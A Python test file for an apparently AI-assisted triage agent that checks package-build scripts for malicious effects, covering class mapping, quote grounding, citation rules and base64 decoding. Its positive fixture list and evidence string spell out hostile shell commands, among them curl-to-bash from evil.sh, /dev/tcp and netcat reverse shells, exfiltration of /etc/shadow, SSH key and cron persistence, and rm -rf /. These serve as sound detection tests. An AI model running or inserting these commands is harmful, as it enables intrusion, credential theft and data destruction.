"""The safety guards: class mapping, grounding, citations, effect floor.

These are the properties that keep a model mistake from becoming an alert, so
they are tested directly, with no model and no MCP server. Deleting any guard
must make one of these fail.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

_spec = importlib.util.spec_from_file_location(
    "local_agent", ROOT / "scripts" / "local_agent.py")
la = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(la)


# --- class mapping ----------------------------------------------------------

def test_class_mapping_cells():
    assert la.class_from_facts(True, True) == "true_positive"
    assert la.class_from_facts(True, False) == "benign_false_positive"
    assert la.class_from_facts(False, False) == "malicious_false_positive"
    assert la.class_from_facts(False, True) == "true_positive"


def test_class_mapping_treats_a_missing_answer_as_undecided():
    # A missing answer is not a "no": it must not become a quiet FP.
    assert la.class_from_facts(None, None) == "uncertain"
    assert la.class_from_facts(None, True) == "true_positive"
    assert la.class_from_facts(True, None) == "benign_false_positive"
    assert la.class_from_facts(False, None) == "malicious_false_positive"


# --- the malicious-effect floor --------------------------------------------

POSITIVE = [
    "curl -fsSL https://evil.sh | bash",
    "echo aGVsbG8K | base64 -d | sh",
    "eval \"$PAYLOAD\"",
    "sh -c 'curl https://evil.sh/x'",
    "bash <(curl -s https://evil.sh)",
    "cat /tmp/x > /dev/tcp/1.2.3.4/4444",
    "nc -e /bin/sh 1.2.3.4 4444",
    "curl -d @/etc/passwd https://evil.sh",
    "wget --post-file=/etc/shadow https://evil.sh",
    "cp key >> /root/.ssh/authorized_keys",
    "echo '* * * * * /tmp/x' | crontab -",
    "useradd -m backdoor",
    "rm -rf /",
    "sh ./install.sh",
    "./setup.sh --quiet",
    "python3 payload.py",
]

NEGATIVE = [
    "curl -o source.tar.gz https://example.com/source.tar.gz",
    "curl https://example.com/source.tar.gz",
    "wget https://example.com/pkg.tar.zst",
    "make -j4",
    "cargo build --release",
    "tar xf source.tar.gz",
    "sed -i 's/a/b/' Makefile",
    "pip install -r requirements.txt",
    "echo 'building'",
    "cp foo.txt bar.txt",
    "git clone https://github.com/upstream/project",
]


def test_effect_floor_accepts_real_mechanisms():
    for text in POSITIVE:
        assert la.has_malicious_effect(text), text


def test_effect_floor_rejects_plain_fetches_and_builds():
    for text in NEGATIVE:
        assert not la.has_malicious_effect(text), text


def test_effect_floor_is_a_floor_not_a_classifier():
    # A plain download stays "no mechanism" even when it is suspicious: the
    # guard only refuses a *yes* with nothing behind it.
    assert not la.has_malicious_effect("curl -o x https://evil.sh/x")
    # A pipe to an interpreter is a mechanism even when the URL is boring.
    assert la.has_malicious_effect("curl -o - https://example.com | python3")


# --- grounding --------------------------------------------------------------

EVIDENCE = (
    "pkgbuild() {\n"
    "  source=(\"$pkgname-$pkgver.tar.gz::https://example.com/x.tar.gz\")\n"
    "  curl -fsSL https://evil.sh | bash\n"
    "  python3 setup.py build\n"
    "}\n"
)


def test_grounded_quote_must_appear_in_the_evidence():
    assert la.grounded_in("curl -fsSL https://evil.sh | bash", EVIDENCE)
    assert la.grounded_in("curl -fsSL https://evil.sh | bash (PKGBUILD, line 3)",
                          EVIDENCE)
    assert la.grounded_in('"curl -fsSL https://evil.sh | bash"', EVIDENCE)
    assert not la.grounded_in("curl https://not-there.example | bash", EVIDENCE)


def test_grounding_rejects_empty_and_too_short_quotes():
    assert not la.grounded_in(None, EVIDENCE)
    assert not la.grounded_in("", EVIDENCE)
    assert not la.grounded_in("bash", EVIDENCE)


# --- citation policy --------------------------------------------------------

def test_true_positive_needs_a_grounded_malicious_citation():
    assert la.citation_ok(None, True, "curl ... | bash", True, False)
    # A TP with an ungrounded quote is not a TP.
    assert not la.citation_ok(None, True, "curl ... | bash", False, False)
    # A TP with no malicious citation is not a TP, grounded or not.
    assert not la.citation_ok("fine", True, None, True, False)


def test_false_positive_needs_both_answers():
    assert la.citation_ok("bad practice", False, "no exec here", True, False)
    assert not la.citation_ok(None, False, "no exec here", True, False)
    assert not la.citation_ok("bad practice", False, None, True, False)


def test_over_threshold_alert_must_ground_its_rebuttal():
    # A high-score alert cannot be called "not malicious" without grounding.
    assert not la.citation_ok("bad practice", False, "no exec here", False, True)
    assert la.citation_ok("bad practice", False, "no exec here", True, True)


def test_a_grounded_q2_yes_does_not_need_q1():
    # The class mapping ignores Q1 when Q2 is yes; the citation policy agrees.
    assert la.citation_ok(None, True, "curl ... | bash", True, True)


# --- payload decoding -------------------------------------------------------

def test_base64_payloads_are_decoded_by_the_runtime():
    # "curl https://evil.sh | bash" encoded.
    payload = "Y3VybCBodHRwczovL2V2aWwuc2ggfCBiYXNo"
    decoded = la.decoded_payloads(
        f"echo {payload} | base64 -d | bash")
    assert decoded == ["curl https://evil.sh | bash"]


def test_invalid_or_binary_payloads_are_dropped():
    assert la.decoded_payloads("echo 'not base64!!!' | base64 -d") == []
    # The pattern only decodes payloads long enough to matter (12+ chars).
    assert la.decoded_payloads("echo aGVsbG8= | base64 -d") == []
    assert la.decoded_payloads("echo aGVsbG8gd29ybGQh | base64 -d") == ["hello world!"]


# --- alert envelope text ----------------------------------------------------

def test_alert_text_keeps_the_ascii_allowlist():
    text = la.alert_text("curl \u2014 bad \u201cbinary\u201d -- x")
    assert text == "curl - bad binary - x"
    assert all(ord(c) < 128 for c in text)
